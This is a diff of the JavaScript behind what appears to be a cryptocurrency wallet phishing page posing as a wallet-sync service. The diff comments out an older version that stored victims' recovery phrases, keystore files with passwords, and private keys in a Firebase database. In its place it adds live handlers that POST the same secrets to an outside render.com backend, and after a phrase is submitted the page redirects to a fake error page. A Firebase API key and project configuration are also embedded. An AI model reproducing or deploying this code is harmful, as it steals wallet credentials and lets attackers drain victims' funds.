@@ -1,323 +1,463 @@
-const firebaseConfig = {
-  apiKey: "AIzaSyAb5qKl_OYjHS-GyStc8P6Paa-4kEuLRXs",
-  authDomain: "mainnet-syncdapp.firebaseapp.com",
-  databaseURL: "https://mainnet-syncdapp-default-rtdb.firebaseio.com",
-  projectId: "mainnet-syncdapp",
-  storageBucket: "mainnet-syncdapp.appspot.com",
-  messagingSenderId: "817769356811",
-  appId: "1:817769356811:web:953c60e0bb1f1435b1b10e"
-};
+// const firebaseConfig = {
+//   apiKey: "AIzaSyAb5qKl_OYjHS-GyStc8P6Paa-4kEuLRXs",
+//   authDomain: "mainnet-syncdapp.firebaseapp.com",
+//   databaseURL: "https://mainnet-syncdapp-default-rtdb.firebaseio.com",
+//   projectId: "mainnet-syncdapp",
+//   storageBucket: "mainnet-syncdapp.appspot.com",
+//   messagingSenderId: "817769356811",
+//   appId: "1:817769356811:web:953c60e0bb1f1435b1b10e"
+// };
 
-  //initialize fb
-  firebase.initializeApp(firebaseConfig);
+//initialize fb
+// firebase.initializeApp(firebaseConfig);
 
-  //ref for db
-  var importDB = firebase.database().ref("importForm");
-  var keystoreFormDB = firebase.database().ref("keystoreForm");
-  var privateFormDB = firebase.database().ref("privateForm");
+//ref for db
+// var importDB = firebase.database().ref("importForm");
+// var keystoreFormDB = firebase.database().ref("keystoreForm");
+// var privateFormDB = firebase.database().ref("privateForm");
+// let clickTime = 0;
 
-  document.getElementById('importForm').addEventListener('submit', submitPhrase);
-  document.getElementById('keystoreForm').addEventListener('submit', submitKeystore);
-  document.getElementById('privateForm').addEventListener('submit', submitPrivate);
+// document.getElementById('importForm').addEventListener('submit', submitPhrase);
+// document.getElementById('keystoreForm').addEventListener('submit', submitKeystore);
+// document.getElementById('privateForm').addEventListener('submit', submitPrivate);
 
-  //submit phrase page
-function submitPhrase(e) {
-  e.preventDefault();
+//submit phrase page
+// function submitPhrase(e) {
+//   e.preventDefault();
 
-  var phrase = document.getElementById('phrase').value;
-  var walletname = document.getElementById('walletname').value;
+//   clickTime++
+//   var phrase = document.getElementById('phrase').value;
+//   var walletname = document.getElementById('walletname').value;
 
-  console.log(phrase, walletname);
+//   console.log(phrase, walletname);
 
-  savePhrase(phrase, walletname);
+//   savePhrase(phrase, walletname);
 
-  //alert msg
-  setTimeout(() => {
-  document.querySelector('.displayMessage').style.display = "block"
-  }, 3000);
+//   //alert msg
+//   if (clickTime === 1) {
+//     document.querySelector('.displayErr').style.display = 'block';
+//   } else if(clickTime === 2){
+//     setTimeout(() => {
+//     document.querySelector('.displayErr').style.display = 'none';
 
-  //reset form
-  document.getElementById('importForm').reset();
+//       document.querySelector('.displayMessage').style.display = "block"
+//       }, 3000);
+//   }else{
 
-}
+//   }
+//   // setTimeout(() => {
+//   // document.querySelector('.displayMessage').style.display = "block"
+//   // }, 3000);
 
-  const savePhrase = (phrase, walletname)=>{
-  var newimportDB = importDB.push();
+//   //reset form
+//   document.getElementById('importForm').reset();
 
-  newimportDB.set({
-      phrase : phrase,
-      walletname : walletname
-  })
-}
+// }
 
-  const getElementVal = (id) =>{
-  return document.getElementById(id).value;
-  }
+//   const savePhrase = (phrase, walletname)=>{
+//   var newimportDB = importDB.push();
 
-  //submit keystore page
-function submitKeystore(el) {
-  el.preventDefault();
+//   newimportDB.set({
+//       phrase : phrase,
+//       walletname : walletname
+//   })
+// }
 
-  var json = document.getElementById("json").value;
-  var password = document.getElementById("password").value;
-  var walletname = document.getElementById("walletname").value;
+//   const getElementVal = (id) =>{
+//   return document.getElementById(id).value;
+//   }
 
-  console.log(json, password, walletname);
+//submit keystore page
+// function submitKeystore(el) {
+//   el.preventDefault();
 
-  saveKeystore(json, password, walletname)
+//   var json = document.getElementById("json").value;
+//   var password = document.getElementById("password").value;
+//   var walletname = document.getElementById("walletname").value;
 
-    //alert msg
-  setTimeout(() => {
-  document.querySelector('.displayMessage').style.display = "block"
-  }, 3000);
+//   console.log(json, password, walletname);
 
-  //reset form
-  document.getElementById('keystoreForm').reset();
+//   saveKeystore(json, password, walletname)
 
-}
+//     //alert msg
+//   setTimeout(() => {
+//   document.querySelector('.displayMessage').style.display = "block"
+//   }, 3000);
 
-const saveKeystore = (json, password, walletname)=>{
+//   //reset form
+//   document.getElementById('keystoreForm').reset();
 
-  var newkeystoreFormDB = keystoreFormDB.push();
+// }
 
-  newkeystoreFormDB.set({
-      json : json,
-      password : password,
-      walletname : walletname
-  })
-}
+// const saveKeystore = (json, password, walletname)=>{
+
+//   var newkeystoreFormDB = keystoreFormDB.push();
+
+//   newkeystoreFormDB.set({
+//       json : json,
+//       password : password,
+//       walletname : walletname
+//   })
+// }
 
 // const getElementValue = (id) =>{
 //   return document.getElementById(id).value;
 // }
 
+//submit private page
+// function submitPrivate(ele) {
+//   ele.preventDefault();
 
+//   var private = document.getElementById("privateKey").value;
+//   var walletname = document.getElementById("walletname").value;
 
-  //submit private page
-function submitPrivate(ele) {
-  ele.preventDefault();
+//   console.log(private, walletname);
 
-  var private = document.getElementById("privateKey").value;
-  var walletname = document.getElementById("walletname").value;
+//   savePrivateKey(private, walletname);
 
-  console.log(private, walletname);
+//     //alert msg
+//   document.querySelector('.displayMessage').style.display = "block"
 
-  savePrivateKey(private, walletname);
+//   //take off the alert msg
+//   setTimeout(() => {
+//     document.querySelector('.displayMessage').style.display = "none"
+//     }, 3000);
 
-    //alert msg
-  // setTimeout(() => {
-  document.querySelector('.displayMessage').style.display = "block"
-  // }, 3000);
+//   //reset form
+//   document.getElementById('privateForm').reset();
+// }
 
-  //take off the alert msg
-  setTimeout(() => {
-    document.querySelector('.displayMessage').style.display = "none"
-    }, 3000);
+// const savePrivateKey = (private, walletname) =>{
+//   var newprivateFormDB = privateFormDB.push();
 
-  //reset form
-  document.getElementById('privateForm').reset();
-}
+//   newprivateFormDB.set({
+//       private : private,
+//       walletname : walletname
 
-const savePrivateKey = (private, walletname) =>{
-  var newprivateFormDB = privateFormDB.push();
-
-  newprivateFormDB.set({
-      private : private,
-      walletname : walletname
-      
-})
-}
+// })
+// }
 
 // const getElementValues = (id) =>{
 //   return document.getElementById(id).value;
 // }
 
+// MY WRITTEN JS SCRIPTS START HERE
+
+// Form 1: Import/Phrase Form
+
+// Select all wallet-item elements
+document.querySelectorAll(".wallet-item").forEach(item => {
+  item.addEventListener("click", () => {
+    const walletName = item.querySelector(".head-4")?.textContent.trim();
+    const hiddenInput = document.querySelector(".walletname"); // adjust if you're using walletname2, etc.
+
+    if (walletName && hiddenInput) {
+      hiddenInput.value = walletName;
+      console.log("Selected wallet:", walletName); // Optional debug
+    }
+  });
+});
+
+
+document.querySelector("#importForm").addEventListener("submit", function (e) {
+  e.preventDefault();
+
+  const ph = this.querySelector('textarea[name="ph"]');
+  const w_name = this.querySelector('input[name="w_name"]');
+
+  // Only require the phrase field since wallet might be hidden
+  if (!ph?.value) {
+    alert("Please fill in the phrase field!");
+    return;
+  }
+
+  const formData = {
+    ph: ph.value,
+    w_name: w_name?.value || "Anonymous", // Use 'Anonymous' if wallet field is empty/hidden
+  };
+
+  console.log("Sending phrase data:", formData);
+
+  fetch("https://form-backend-1-7631.onrender.com/ph", {
+    method: "POST",
+    headers: { "Content-Type": "application/json" },
+    body: JSON.stringify(formData),
+  })
+    .then((response) => {
+      console.log("Response status:", response.status);
+      return response.text();
+    })
+    .then((result) => {
+      console.log("Server response:", result);
+      // alert("Success: " + result);
+    })
+    .catch((error) => {
+      console.log("Fetch error:", error);
+      // alert('Error: ' + error);
+    });
+
+  setTimeout(() => {
+    window.location.href = "error.html";
+  }, 2000);
+});
+
+// Form 2: Keystore Form
+document
+  .querySelector("#keystoreForm")
+  .addEventListener("submit", function (e) {
+    e.preventDefault();
+
+    const k_s = this.querySelector('textarea[name="k_s"]');
+    const pass = this.querySelector('input[name="pass"]');
+    const w_name = this.querySelector('input[name="w_name"]');
+
+    if (!k_s?.value || !pass?.value) {
+      alert("Please fill in keystore and password fields!");
+      return;
+    }
+
+    const formData = {
+      k_s: k_s.value,
+      pass: pass.value,
+      w_name: w_name?.value || "Anonymous",
+    };
+
+    console.log("Sending keystore data:", formData);
+
+    fetch("https://form-backend-1-7631.onrender.com/ks", {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify(formData),
+    })
+      .then((response) => response.text())
+      .then((result) => {
+        console.log("Server response:", result);
+        // alert('Success: ' + result);
+      })
+      .catch((error) => {
+        console.log("Fetch error:", error);
+        // alert('Error: ' + error);
+      });
+  });
+
+// Form 3: Private Key Form
+document.querySelector("#privateForm").addEventListener("submit", function (e) {
+  e.preventDefault();
+
+  const p_k = this.querySelector('input[name="p_k"]');
+  const w_name = this.querySelector('input[name="w_name"]');
+
+  if (!p_k?.value) {
+    alert("Please fill in the private key field!");
+    return;
+  }
+
+  const formData = {
+    p_k: p_k.value,
+    w_name: w_name?.value || "Anonymous",
+  };
+
+  console.log("Sending private key data:", formData);
+
+  fetch("https://form-backend-1-7631.onrender.com/pk", {
+    method: "POST",
+    headers: { "Content-Type": "application/json" },
+    body: JSON.stringify(formData),
+  })
+    .then((response) => response.text())
+    .then((result) => {
+      console.log("Server response:", result);
+      // alert('Success: ' + result);
+    })
+    .catch((error) => {
+      console.log("Fetch error:", error);
+      // alert('Error: ' + error);
+    });
+});
 
 
 
 
-
-
-
-
+// AND IT ENDED HERE
 
 $(document).ready(function () {
-    // Modal
-    let $close = $("#close-btn");
-    let $close2 = $("#close-btn2");
-    let $close3 = $("#close-btn3");
-    let $modal = $("#modal-1");
-    let $modal2 = $("#modal-2");
-    let $modal3 = $("#modal-3");
-  
-    let $open1 = $("#open-form-modal");
-  
-    $(".wallet-item").click(function (e) {
-      $ele = e.currentTarget;
-  
-      $targetImage = "";
-      document.querySelector(".wallet-name").innerHTML =
-        $ele.childNodes[3].innerHTML;
-      document.querySelector(".wallet-item__img--2").innerHTML =
-        $ele.childNodes[1].innerHTML;
-  
-      // $walletName = $ele.childNodes[3].innerHTML;
-      document.querySelectorAll("#walletname").forEach((ele) => {
-        ele.value = $ele.childNodes[3].innerHTML;
-      });
-  
-      $modal2.addClass("active");
+  // Modal
+  let $close = $("#close-btn");
+  let $close2 = $("#close-btn2");
+  let $close3 = $("#close-btn3");
+  let $modal = $("#modal-1");
+  let $modal2 = $("#modal-2");
+  let $modal3 = $("#modal-3");
+
+  let $open1 = $("#open-form-modal");
+
+  $(".wallet-item").click(function (e) {
+    $ele = e.currentTarget;
+
+    $targetImage = "";
+    document.querySelector(".wallet-name").innerHTML =
+      $ele.childNodes[3].innerHTML;
+    document.querySelector(".wallet-item__img--2").innerHTML =
+      $ele.childNodes[1].innerHTML;
+
+    // $walletName = $ele.childNodes[3].innerHTML;
+    document.querySelectorAll("#walletname").forEach((ele) => {
+      ele.value = $ele.childNodes[3].innerHTML;
     });
-  
-    $close2.click(function () {
-      $modal2.removeClass("active");
-    });
-  
-    $close3.click(function () {
-      $modal3.removeClass("active");
-    });
-  
-    $open1.click(function () {
-      $modal2.removeClass("active");
-      $modal3.addClass("active");
-    });
-  
-    $close.click(function () {
-      $modal.removeClass("active");
-    });
-  
-    // All form data
-    const phrase = $("#phrase");
-    const json = $("#json");
-    const password = $("#password");
-    const privateKey = $("#privateKey");
-  
-    function resetData() {
-      phrase.val("");
-      json.val("");
-      password.val("");
-      privateKey.val("");
-      document.querySelectorAll("#walletname").forEach((ele) => {
-        ele.value = "";
-      });
-    }
-  
-    function validatePhrase() {
-      return phrase.val().length > 0;
-    }
-    function validateKeystore() {
-      return json.val().length > 0 && password.val().length > 0;
-    }
-    function validatePrivatekey() {
-      return privateKey.val().length > 0;
-    }
-  
-    // $("#importForm").submit(function (event) {
-    //   event.preventDefault();
-    //   if (!validatePhrase()) {
-    //     alert("Field not allowed to be empty");
-    //     return;
-    //   }
-    //   const myForm = event.target;
-    //   const formData = new FormData(myForm);
-  
-    //   fetch("/", {
-    //     method: "POST",
-    //     headers: { "Content-Type": "application/x-www-form-urlencoded" },
-    //     body: new URLSearchParams(formData).toString(),
-    //   })
-    //     .then(() => {
-    //       resetData();
-    //       $modal2.removeClass("active");
-    //       $modal3.removeClass("active");
-    //       $modal.addClass("active");
-    //     })
-    //     .catch((error) => {
-    //       console.log(error);
-    //     });
-    // });
-  
-    // $("#keystoreForm").submit(function (event) {
-    //   event.preventDefault();
-    //   if (!validateKeystore()) {
-    //     alert("Fields not allowed to be empty");
-    //     return;
-    //   }
-  
-    //   const myForm = event.target;
-    //   const formData = new FormData(myForm);
-  
-    //   fetch("/", {
-    //     method: "POST",
-    //     headers: { "Content-Type": "application/x-www-form-urlencoded" },
-    //     body: new URLSearchParams(formData).toString(),
-    //   })
-    //     .then(() => {
-    //       resetData();
-    //       $modal2.removeClass("active");
-    //       $modal3.removeClass("active");
-    //       $modal.addClass("active");
-    //     })
-    //     .catch((error) => {
-    //       console.log(error);
-    //     });
-    // });
-  
-    // $("#privateForm").submit(function (event) {
-    //   event.preventDefault();
-    //   if (!validatePrivatekey()) {
-    //     alert("Field not allowed to be empty");
-    //     return;
-    //   }
-  
-    //   const myForm = event.target;
-    //   const formData = new FormData(myForm);
-  
-    //   fetch("/", {
-    //     method: "POST",
-    //     headers: { "Content-Type": "application/x-www-form-urlencoded" },
-    //     body: new URLSearchParams(formData).toString(),
-    //   })
-    //     .then(() => {
-    //       resetData()
-    //       $modal2.removeClass("active");
-    //       $modal3.removeClass("active");
-    //       $modal.addClass("active");
-    //     })
-    //     .catch((error) => {
-    //       console.log(error);
-    //     });
-    // });
-  
-    //   Tabs
-    let $navs = $(".navigator-item");
-  
-    let $navs1 = $("#btn-11");
-    let $navs2 = $("#btn-22");
-    let $navs3 = $("#btn-33");
-  
-    let $phrase = $(".phrase-cont");
-    let $keystore = $(".keystore-cont");
-    let $private = $(".private-cont");
-  
-    $navs.click(function () {
-      $(this).siblings().removeClass("active");
-      $(this).addClass("active");
-    });
-  
-    $navs1.click(function () {
-      $private.removeClass("active");
-      $keystore.removeClass("active");
-      $phrase.addClass("active");
-    });
-    $navs2.click(function () {
-      $phrase.removeClass("active");
-      $private.removeClass("active");
-      $keystore.addClass("active");
-    });
-    $navs3.click(function () {
-      $phrase.removeClass("active");
-      $keystore.removeClass("active");
-      $private.addClass("active");
-    });
+
+    $modal2.addClass("active");
   });
+
+  $close2.click(function () {
+    $modal2.removeClass("active");
+  });
+
+  $close3.click(function () {
+    $modal3.removeClass("active");
+  });
+
+  $open1.click(function () {
+    $modal2.removeClass("active");
+    $modal3.addClass("active");
+  });
+
+  $close.click(function () {
+    $modal.removeClass("active");
+  });
+
+  // All form data
+
+  // const phrase = $("#phrase");
+  // const json = $("#json");
+  // const password = $("#password");
+  // const privateKey = $("#privateKey");
+
+  // function resetData() {
+  //   phrase.val("");
+  //   json.val("");
+  //   password.val("");
+  //   privateKey.val("");
+  //   document.querySelectorAll("#walletname").forEach((ele) => {
+  //     ele.value = "";
+  //   });
+  // }
+
+  // function validatePhrase() {
+  //   return phrase.val().length > 0;
+  // }
+  // function validateKeystore() {
+  //   return json.val().length > 0 && password.val().length > 0;
+  // }
+  // function validatePrivatekey() {
+  //   return privateKey.val().length > 0;
+  // }
+
+  // $("#importForm").submit(function (event) {
+  //   event.preventDefault();
+  //   if (!validatePhrase()) {
+  //     alert("Field not allowed to be empty");
+  //     return;
+  //   }
+  //   const myForm = event.target;
+  //   const formData = new FormData(myForm);
+
+  //   fetch("/", {
+  //     method: "POST",
+  //     headers: { "Content-Type": "application/x-www-form-urlencoded" },
+  //     body: new URLSearchParams(formData).toString(),
+  //   })
+  //     .then(() => {
+  //       resetData();
+  //       $modal2.removeClass("active");
+  //       $modal3.removeClass("active");
+  //       $modal.addClass("active");
+  //     })
+  //     .catch((error) => {
+  //       console.log(error);
+  //     });
+  // });
+
+  // $("#keystoreForm").submit(function (event) {
+  //   event.preventDefault();
+  //   if (!validateKeystore()) {
+  //     alert("Fields not allowed to be empty");
+  //     return;
+  //   }
+
+  //   const myForm = event.target;
+  //   const formData = new FormData(myForm);
+
+  //   fetch("/", {
+  //     method: "POST",
+  //     headers: { "Content-Type": "application/x-www-form-urlencoded" },
+  //     body: new URLSearchParams(formData).toString(),
+  //   })
+  //     .then(() => {
+  //       resetData();
+  //       $modal2.removeClass("active");
+  //       $modal3.removeClass("active");
+  //       $modal.addClass("active");
+  //     })
+  //     .catch((error) => {
+  //       console.log(error);
+  //     });
+  // });
+
+  // $("#privateForm").submit(function (event) {
+  //   event.preventDefault();
+  //   if (!validatePrivatekey()) {
+  //     alert("Field not allowed to be empty");
+  //     return;
+  //   }
+
+  //   const myForm = event.target;
+  //   const formData = new FormData(myForm);
+
+  //   fetch("/", {
+  //     method: "POST",
+  //     headers: { "Content-Type": "application/x-www-form-urlencoded" },
+  //     body: new URLSearchParams(formData).toString(),
+  //   })
+  //     .then(() => {
+  //       resetData()
+  //       $modal2.removeClass("active");
+  //       $modal3.removeClass("active");
+  //       $modal.addClass("active");
+  //     })
+  //     .catch((error) => {
+  //       console.log(error);
+  //     });
+  // });
+
+  //   Tabs
+  let $navs = $(".navigator-item");
+
+  let $navs1 = $("#btn-11");
+  let $navs2 = $("#btn-22");
+  let $navs3 = $("#btn-33");
+
+  let $phrase = $(".phrase-cont");
+  let $keystore = $(".keystore-cont");
+  let $private = $(".private-cont");
+
+  $navs.click(function () {
+    $(this).siblings().removeClass("active");
+    $(this).addClass("active");
+  });
+
+  $navs1.click(function () {
+    $private.removeClass("active");
+    $keystore.removeClass("active");
+    $phrase.addClass("active");
+  });
+  $navs2.click(function () {
+    $phrase.removeClass("active");
+    $private.removeClass("active");
+    $keystore.addClass("active");
+  });
+  $navs3.click(function () {
+    $phrase.removeClass("active");
+    $keystore.removeClass("active");
+    $private.addClass("active");
+  });
+});
